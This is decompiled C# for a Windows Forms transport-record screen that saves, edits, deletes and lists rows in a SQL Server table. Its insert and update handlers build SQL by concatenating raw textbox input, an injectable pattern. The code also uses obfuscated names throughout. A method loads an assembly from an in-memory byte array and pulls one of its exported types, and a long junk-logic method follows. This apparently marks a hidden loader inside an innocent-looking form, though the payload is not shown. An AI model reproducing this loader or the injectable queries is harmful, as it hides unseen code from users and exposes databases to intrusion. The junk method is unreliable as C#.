using System;
using System.ComponentModel;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Cd2;
using Fg5p;
using Jr8;
using Microsoft.VisualBasic.CompilerServices;
using Ps92;
using Wy4;
using Xr2;
using b1C5;
using j8P3;
using k6J;
using n0WD;
using n4M;
using n7K;
using o1N;
using o9R;
using p6S;
using y1M;
using y8D;

namespace Dn57;

[DesignerGenerated]
public class Nn9a : Form
{
	private IContainer components;

	private string cs;

	private SqlConnection cn;

	private SqlCommand cmd;

	private SqlDataReader rd;

	internal virtual Button btnSave
	{
		[CompilerGenerated]
		get
		{
			return _btnSave;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = i5R8;
			Button val = _btnSave;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnSave = value;
			val = _btnSave;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("txtTid")]
	internal virtual TextBox txtTid
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtTCost")]
	internal virtual TextBox txtTCost
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtTDistance")]
	internal virtual TextBox txtTDistance
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtTMode")]
	internal virtual TextBox txtTMode
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label6
	{
		[CompilerGenerated]
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = a1JY;
			Label label = _Label6;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label6 = value;
			label = _Label6;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label7
	{
		[CompilerGenerated]
		get
		{
			return _Label7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = z3Y5;
			Label label = _Label7;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label7 = value;
			label = _Label7;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("DataGridView1")]
	internal virtual DataGridView DataGridView1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnModify
	{
		[CompilerGenerated]
		get
		{
			return _btnModify;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = m7K5;
			Button val = _btnModify;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnModify = value;
			val = _btnModify;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button btnDelete
	{
		[CompilerGenerated]
		get
		{
			return _btnDelete;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = s6X7;
			Button val = _btnDelete;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnDelete = value;
			val = _btnDelete;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	public Nn9a()
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Wm5f);
		cs = "Data Source=DESKTOP-1L8UME0\\SQLEXPRESS;Initial Catalog=db_fabric;Integrated Security=True";
		cn = new SqlConnection(cs);
		cmd = new SqlCommand();
		k1QN();
	}

	[DebuggerNonUserCode]
	protected override void j1Y6(bool Bc0k)
	{
		try
		{
			if (Bc0k && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Bc0k);
		}
	}

	[DebuggerStepThrough]
	private void k1QN()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_041d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0427: Expected O, but got Unknown
		//IL_04bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c7: Expected O, but got Unknown
		//IL_055e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0568: Expected O, but got Unknown
		btnSave = new Button();
		txtTid = new TextBox();
		Label1 = new Label();
		Label2 = new Label();
		Label3 = new Label();
		Label4 = new Label();
		txtTCost = new TextBox();
		txtTDistance = new TextBox();
		txtTMode = new TextBox();
		Label5 = new Label();
		Label6 = new Label();
		Label7 = new Label();
		DataGridView1 = new DataGridView();
		btnModify = new Button();
		btnDelete = new Button();
		((ISupportInitialize)DataGridView1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)btnSave).set_Location(new Point(160, 202));
		((Control)btnSave).set_Name("btnSave");
		((Control)btnSave).set_Size(new Size(75, 23));
		((Control)btnSave).set_TabIndex(4);
		((ButtonBase)btnSave).set_Text("SAVE");
		((ButtonBase)btnSave).set_UseVisualStyleBackColor(true);
		((Control)txtTid).set_Location(new Point(173, 40));
		((Control)txtTid).set_Name("txtTid");
		((Control)txtTid).set_Size(new Size(100, 20));
		((Control)txtTid).set_TabIndex(0);
		Label1.set_AutoSize(true);
		((Control)Label1).set_ForeColor(Color.White);
		((Control)Label1).set_Location(new Point(58, 90));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(82, 13));
		((Control)Label1).set_TabIndex(2);
		Label1.set_Text("Transport Cost :");
		Label2.set_AutoSize(true);
		((Control)Label2).set_ForeColor(Color.White);
		((Control)Label2).set_Location(new Point(58, 47));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(70, 13));
		((Control)Label2).set_TabIndex(3);
		Label2.set_Text("Transport Id :");
		Label3.set_AutoSize(true);
		((Control)Label3).set_ForeColor(Color.White);
		((Control)Label3).set_Location(new Point(46, 125));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(103, 13));
		((Control)Label3).set_TabIndex(4);
		Label3.set_Text("Transport Distance :");
		Label4.set_AutoSize(true);
		((Control)Label4).set_ForeColor(Color.White);
		((Control)Label4).set_Location(new Point(46, 158));
		((Control)Label4).set_Name("Label4");
		((Control)Label4).set_Size(new Size(88, 13));
		((Control)Label4).set_TabIndex(5);
		Label4.set_Text("Transport Mode :");
		((Control)txtTCost).set_Location(new Point(173, 83));
		((Control)txtTCost).set_Name("txtTCost");
		((Control)txtTCost).set_Size(new Size(100, 20));
		((Control)txtTCost).set_TabIndex(1);
		((Control)txtTDistance).set_Location(new Point(173, 125));
		((Control)txtTDistance).set_Name("txtTDistance");
		((Control)txtTDistance).set_Size(new Size(100, 20));
		((Control)txtTDistance).set_TabIndex(2);
		((Control)txtTMode).set_Location(new Point(173, 158));
		((Control)txtTMode).set_Name("txtTMode");
		((Control)txtTMode).set_Size(new Size(100, 20));
		((Control)txtTMode).set_TabIndex(3);
		Label5.set_AutoSize(true);
		((Control)Label5).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label5).set_ForeColor(Color.White);
		((Control)Label5).set_Location(new Point(341, 19));
		((Control)Label5).set_Name("Label5");
		((Control)Label5).set_Size(new Size(126, 17));
		((Control)Label5).set_TabIndex(8);
		Label5.set_Text("Transport Detail");
		Label6.set_AutoSize(true);
		((Control)Label6).set_BackColor(Color.Blue);
		((Control)Label6).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label6).set_ForeColor(Color.White);
		((Control)Label6).set_Location(new Point(731, 19));
		((Control)Label6).set_Name("Label6");
		((Control)Label6).set_Size(new Size(18, 17));
		((Control)Label6).set_TabIndex(9);
		Label6.set_Text("X");
		Label7.set_AutoSize(true);
		((Control)Label7).set_BackColor(Color.Blue);
		((Control)Label7).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label7).set_ForeColor(Color.White);
		((Control)Label7).set_Location(new Point(39, 19));
		((Control)Label7).set_Name("Label7");
		((Control)Label7).set_Size(new Size(92, 17));
		((Control)Label7).set_TabIndex(7);
		Label7.set_Text("Go To Main");
		DataGridView1.set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		((Control)DataGridView1).set_Location(new Point(32, 239));
		((Control)DataGridView1).set_Name("DataGridView1");
		((Control)DataGridView1).set_Size(new Size(599, 199));
		((Control)DataGridView1).set_TabIndex(10);
		((Control)btnModify).set_Location(new Point(268, 202));
		((Control)btnModify).set_Name("btnModify");
		((Control)btnModify).set_Size(new Size(75, 23));
		((Control)btnModify).set_TabIndex(5);
		((ButtonBase)btnModify).set_Text("MODIFY");
		((ButtonBase)btnModify).set_UseVisualStyleBackColor(true);
		((Control)btnDelete).set_Location(new Point(380, 202));
		((Control)btnDelete).set_Name("btnDelete");
		((Control)btnDelete).set_Size(new Size(75, 23));
		((Control)btnDelete).set_TabIndex(6);
		((ButtonBase)btnDelete).set_Text("DELETE");
		((ButtonBase)btnDelete).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.FromArgb(0, 0, 64));
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).get_Controls().Add((Control)(object)btnDelete);
		((Control)this).get_Controls().Add((Control)(object)btnModify);
		((Control)this).get_Controls().Add((Control)(object)DataGridView1);
		((Control)this).get_Controls().Add((Control)(object)Label6);
		((Control)this).get_Controls().Add((Control)(object)Label7);
		((Control)this).get_Controls().Add((Control)(object)Label5);
		((Control)this).get_Controls().Add((Control)(object)txtTMode);
		((Control)this).get_Controls().Add((Control)(object)txtTDistance);
		((Control)this).get_Controls().Add((Control)(object)txtTCost);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)txtTid);
		((Control)this).get_Controls().Add((Control)(object)btnSave);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("frmTransportDetail");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("frmTransportDetail");
		((ISupportInitialize)DataGridView1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void i5R8(object sender, EventArgs e)
	{
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c4: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			cn.Open();
			cmd.set_Connection(cn);
			cmd.set_CommandText("insert into tbl_transport values(" + Conversions.ToString(Conversions.ToInteger(txtTid.get_Text())) + ",'" + txtTCost.get_Text() + "'," + txtTDistance.get_Text() + ",'" + txtTMode.get_Text() + "')");
			cmd.ExecuteReader();
			MessageBox.Show("Record Saved");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		finally
		{
			cn.Close();
		}
		Xk72();
	}

	public void Xk72()
	{
		//IL_0154: Unknown result type (might be due to invalid IL or missing references)
		DataGridView1.get_Rows().Clear();
		DataGridView1.get_Columns().Clear();
		try
		{
			cn.Open();
			cmd.set_Connection(cn);
			cmd.set_CommandText("select * from tbl_transport");
			rd = cmd.ExecuteReader();
			DataGridView1.get_Columns().Add("c1", "Transport Id");
			DataGridView1.get_Columns().Add("c2", "Transport Cost");
			DataGridView1.get_Columns().Add("c3", "Transport Distance");
			DataGridView1.get_Columns().Add("c4", "Transport Mode");
			while (rd.Read())
			{
				DataGridView1.get_Rows().Add(new object[4]
				{
					rd.get_Item("transportid").ToString(),
					rd.get_Item("transportcost"),
					rd.get_Item("transportdistance").ToString(),
					rd.get_Item("transportmode")
				});
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		finally
		{
			cn.Close();
		}
	}

	private void z3Y5(object sender, EventArgs e)
	{
		Jy1 jy = new Jy1();
		((Control)jy).Show();
		((Control)this).Hide();
	}

	private void a1JY(object sender, EventArgs e)
	{
		((Component)this).Dispose();
	}

	private void Wm5f(object sender, EventArgs e)
	{
		Xk72();
	}

	private void m7K5(object sender, EventArgs e)
	{
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			cn.Open();
			cmd.set_Connection(cn);
			cmd.set_CommandText("update tbl_transport set transportcost ='" + txtTCost.get_Text() + "',transportdistance=" + txtTDistance.get_Text() + ",transportmode='" + txtTMode.get_Text() + "' where transportid=" + Conversions.ToString(Conversions.ToInteger(txtTid.get_Text())));
			cmd.ExecuteReader();
			MessageBox.Show("Record Modified");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		finally
		{
			cn.Close();
		}
		Xk72();
	}

	private void s6X7(object sender, EventArgs e)
	{
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			cn.Open();
			cmd.set_Connection(cn);
			cmd.set_CommandText("delete from tbl_transport where transportid=" + Conversions.ToString(Conversions.ToInteger(txtTid.get_Text())));
			cmd.ExecuteReader();
			MessageBox.Show("Record Deleted");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		finally
		{
			cn.Close();
		}
		Xk72();
	}

	internal static bool Dz91()
	{
		try
		{
			try
			{
				Em1.mDic.Add(Em1.T, Assembly.Load((byte[])Em1.mDic[Em1.mArray]).GetExportedTypes()[27]);
				return true;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	static void b6B1()
	{
		try
		{
			_ = (Zo8)(object)a7W.Default;
		}
		finally
		{
			_ = (s9EJ)(object)a7W.Default;
			goto IL_001a;
		}
		IL_001a:
		System.Runtime.CompilerServices.Unsafe.SkipInit(out a7W a7W);
		try
		{
			try
			{
				_ = (b6E)(object)a7W.Default;
			}
			finally
			{
				_ = (Jy1)(object)a7W.Default;
				a7W = null;
				a7W = a7W;
				Sm6 sm = sm;
				sm = sm;
				_ = (En1)(object)a7W.Default;
				goto end_IL_001b;
			}
			end_IL_001b:;
		}
		catch
		{
			_ = (En1)(object)a7W.Default;
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Em1 em);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out y8R y8R);
		try
		{
			em = null;
			em = em;
		}
		finally
		{
			try
			{
				y8R obj2 = (y8R)(object)a7W.Default;
				y8R = null;
				y8R = obj2;
			}
			catch
			{
				_ = (_003CModule_003E)(object)a7W.Default;
				_ = (En1)(object)a7W.Default;
			}
			finally
			{
				goto IL_00b4;
			}
		}
		IL_03d1:
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object obj5);
		nuint num;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Nm2f nm2f);
		try
		{
			if ((nuint)(UIntPtr)a7W.Default / (nuint)(UIntPtr)a7W.Default == 0)
			{
				try
				{
					_ = (_003CModule_003E)(object)a7W.Default;
				}
				catch
				{
					_ = (b6E)(object)a7W.Default;
				}
			}
			else if (num == 0)
			{
				_ = (Ta6)(object)a7W.Default;
			}
		}
		catch
		{
			checked
			{
				try
				{
					if (num - unchecked((nuint)(UIntPtr)a7W.Default) == 0)
					{
						_ = (i0A1)(object)a7W.Default;
					}
					else
					{
						_ = (s9EJ)(object)a7W.Default;
					}
				}
				finally
				{
					do
					{
						nm2f = nm2f;
					}
					while (obj5 != null);
					goto end_IL_0417;
				}
			}
			end_IL_0417:;
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out a1B a1B);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out j3J j3J);
		try
		{
			if ((UIntPtr)a7W.Default == (UIntPtr)(nuint)0u)
			{
				a1B = null;
			}
			else
			{
				_ = (Sm6)(object)a7W.Default;
			}
		}
		catch
		{
			try
			{
				_ = (Em1)(object)a7W.Default;
				j3J = j3J;
			}
			finally
			{
				_ = (j3J)(object)a7W.Default;
				goto end_IL_0477;
			}
			end_IL_0477:;
		}
		num = default(UIntPtr);
		if (num == 0)
		{
			try
			{
				_ = (Sm6)(object)a7W.Default;
			}
			catch
			{
				System.Runtime.CompilerServices.Unsafe.SkipInit(out En1 en);
				do
				{
					en = en;
					en = en;
				}
				while (obj5 != null);
			}
		}
		else if ((UIntPtr)a7W.Default == (UIntPtr)(nuint)0u)
		{
			if (num == 0)
			{
				j3J = j3J;
			}
			else
			{
				y8R = (y8R)(object)a7W.Default;
				_ = (Em1)(object)a7W.Default;
			}
		}
		_ = (j3J)(object)a7W.Default;
		try
		{
			do
			{
				_ = (Zo8)(object)a7W.Default;
			}
			while ((object)a7W.Default != null);
		}
		catch
		{
			_ = a7W.Default;
		}
		finally
		{
			if ((UIntPtr)a7W.Default == (UIntPtr)(nuint)0u)
			{
				checked
				{
					if (unchecked((nuint)(UIntPtr)a7W.Default) * unchecked((nuint)(UIntPtr)a7W.Default) == 0)
					{
						nm2f = (Nm2f)(object)a7W.Default;
					}
					else
					{
						em = em;
					}
				}
			}
			goto IL_0588;
		}
		IL_00b4:
		if ((UIntPtr)a7W.Default == (UIntPtr)(nuint)0u)
		{
			try
			{
				while (true)
				{
					obj5 = obj5;
					if (obj5 != null)
					{
						_ = (Em1)(object)a7W.Default;
						continue;
					}
					break;
				}
			}
			catch
			{
				_ = (s9EJ)(object)a7W.Default;
			}
		}
		else
		{
			do
			{
				_ = (Em1)(object)a7W.Default;
			}
			while (obj5 != null);
		}
		num = default(UIntPtr);
		num = default(UIntPtr);
		i0A1 i0A;
		checked
		{
			if (num - unchecked((nuint)(UIntPtr)a7W.Default) == 0)
			{
				while (obj5 != null)
				{
					_ = (Em1)(object)a7W.Default;
				}
			}
			else
			{
				try
				{
					_ = (y8R)(object)a7W.Default;
				}
				catch
				{
					while ((object)a7W.Default != null)
					{
						em = em;
					}
				}
			}
			System.Runtime.CompilerServices.Unsafe.SkipInit(out Jy1 jy);
			while (obj5 != null)
			{
				do
				{
					try
					{
						i0A = null;
						i0A = i0A;
					}
					finally
					{
						jy = jy;
						jy = jy;
						continue;
					}
				}
				while ((object)a7W.Default != null);
			}
		}
		if (num == 0)
		{
			num = default(UIntPtr);
			if (checked(num - (num + num) * unchecked(unchecked((nuint)default(UIntPtr)) / unchecked((nuint)default(UIntPtr)))) / unchecked((nuint)default(UIntPtr)) == 0)
			{
				try
				{
					a1B = a1B;
					a1B = a1B;
				}
				finally
				{
					_ = (Nn9a)(object)a7W.Default;
					_ = (Nn9a)(object)a7W.Default;
					goto IL_021c;
				}
			}
			_ = (Em1)(object)a7W.Default;
		}
		goto IL_021c;
		IL_07f9:
		i0A = (i0A1)(object)a7W.Default;
		_ = (Nm2f)(object)a7W.Default;
		_ = (Ln53)(object)a7W.Default;
		return;
		IL_05ea:
		y8R = null;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Ln53 ln);
		do
		{
			try
			{
				UIntPtr num2 = (UIntPtr)a7W.Default;
				num = default(UIntPtr);
				checked
				{
					nuint num3 = num - unchecked((nuint)(UIntPtr)a7W.Default);
					num = default(UIntPtr);
					if (unchecked((nuint)num2) + (num3 + num) == 0)
					{
						a7W = a7W;
					}
				}
			}
			finally
			{
				if (num == 0)
				{
					ln = ln;
					ln = ln;
				}
				continue;
			}
		}
		while (obj5 != null);
		nm2f = nm2f;
		_ = (Qg6)(object)a7W.Default;
		_ = (i0A1)(object)a7W.Default;
		do
		{
			_ = (Qg6)(object)a7W.Default;
		}
		while ((object)a7W.Default != null);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out b6E b6E);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Ta6 ta);
		try
		{
		}
		catch
		{
			_ = (b6E)(object)a7W.Default;
			_003CModule_003E _003CModule_003E = (_003CModule_003E)(object)a7W.Default;
			b6E = b6E;
		}
		finally
		{
			try
			{
			}
			finally
			{
				try
				{
					_ = (j3J)(object)a7W.Default;
					y8R = y8R;
					_ = (Ln53)(object)a7W.Default;
				}
				catch
				{
					ta = (Ta6)(object)a7W.Default;
				}
				goto IL_06e4;
			}
		}
		IL_033b:
		do
		{
			if (num != 0)
			{
				_ = (Jy1)(object)a7W.Default;
				continue;
			}
			num = default(UIntPtr);
			if (num == 0)
			{
				em = em;
			}
		}
		while ((object)a7W.Default != null);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out s9EJ s9EJ);
		Zo8 zo;
		try
		{
			if ((UIntPtr)a7W.Default == (UIntPtr)(nuint)0u)
			{
				if ((UIntPtr)a7W.Default == (UIntPtr)(nuint)0u)
				{
					ta = ta;
				}
				else
				{
					b6E = b6E;
					b6E = null;
				}
			}
			else
			{
				s9EJ = (s9EJ)(object)a7W.Default;
				b6E = null;
			}
		}
		finally
		{
			try
			{
				num = default(UIntPtr);
				if (num == 0)
				{
					ta = ta;
				}
			}
			catch
			{
				try
				{
					a1B = a1B;
				}
				finally
				{
					_003CModule_003E _003CModule_003E = (_003CModule_003E)(object)a7W.Default;
					zo = (Zo8)(object)a7W.Default;
					goto end_IL_03a4;
				}
				end_IL_03a4:;
			}
			goto IL_03d1;
		}
		IL_021c:
		try
		{
			if ((UIntPtr)a7W.Default == (UIntPtr)(nuint)0u)
			{
				try
				{
					_ = (a1B)(object)a7W.Default;
				}
				finally
				{
					j3J = null;
					j3J = j3J;
					Jy1 jy = (Jy1)(object)a7W.Default;
					goto end_IL_021d;
				}
			}
			do
			{
				y8R = y8R;
			}
			while (obj5 != null);
			end_IL_021d:;
		}
		catch
		{
			try
			{
				if ((UIntPtr)a7W.Default == (UIntPtr)(nuint)0u)
				{
				}
			}
			catch
			{
				y8R = null;
			}
		}
		zo = null;
		zo = zo;
		try
		{
			try
			{
				_ = (i0A1)(object)a7W.Default;
				s9EJ = s9EJ;
				s9EJ = null;
			}
			finally
			{
				_ = (b1YL)(object)a7W.Default;
				goto end_IL_028a;
			}
			end_IL_028a:;
		}
		catch
		{
			_003CModule_003E _003CModule_003E = null;
			_003CModule_003E = _003CModule_003E;
		}
		finally
		{
			num = default(UIntPtr);
			if (num == 0)
			{
				try
				{
					_ = (s9EJ)(object)a7W.Default;
					_ = (En1)(object)a7W.Default;
				}
				finally
				{
					_ = (b1YL)(object)a7W.Default;
					goto IL_033b;
				}
			}
			_ = (s9EJ)(object)a7W.Default;
			goto IL_033b;
		}
		IL_0588:
		while (obj5 != null)
		{
			i0A = (i0A1)(object)a7W.Default;
		}
		try
		{
			try
			{
				j3J = j3J;
			}
			catch
			{
				i0A = (i0A1)(object)a7W.Default;
			}
		}
		catch
		{
			do
			{
				_ = (Ta6)(object)a7W.Default;
			}
			while (obj5 != null);
		}
		finally
		{
			En1 en = (En1)(object)a7W.Default;
			_ = (i0A1)(object)a7W.Default;
			_ = (Em1)(object)a7W.Default;
			goto IL_05ea;
		}
		IL_06e4:
		_ = (Ln53)(object)a7W.Default;
		nm2f = nm2f;
		if ((UIntPtr)a7W.Default == (UIntPtr)(nuint)0u)
		{
		}
		while (obj5 != null)
		{
			nuint num4 = num;
			num = default(UIntPtr);
			if (checked(num4 + num) == 0)
			{
				num = default(UIntPtr);
				if (num == 0)
				{
					ln = ln;
				}
				else
				{
					_ = a7W.Default;
				}
			}
			else
			{
				_ = a7W.Default;
				s9EJ = s9EJ;
				_ = (b1YL)(object)a7W.Default;
				_ = (Qg6)(object)a7W.Default;
			}
		}
		_ = a7W.Default;
		ln = null;
		_ = (Ln53)(object)a7W.Default;
		_ = (Ln53)(object)a7W.Default;
		_ = (Zo8)(object)a7W.Default;
		if (num == 0)
		{
			try
			{
				while (obj5 != null)
				{
					y8R = null;
				}
			}
			finally
			{
				if ((UIntPtr)a7W.Default == (UIntPtr)(nuint)0u)
				{
					_ = (Nm2f)(object)a7W.Default;
					Sm6 sm = (Sm6)(object)a7W.Default;
					ln = (Ln53)(object)a7W.Default;
				}
				else
				{
					_ = (s9EJ)(object)a7W.Default;
				}
				goto IL_07f9;
			}
		}
		goto IL_07f9;
	}
}
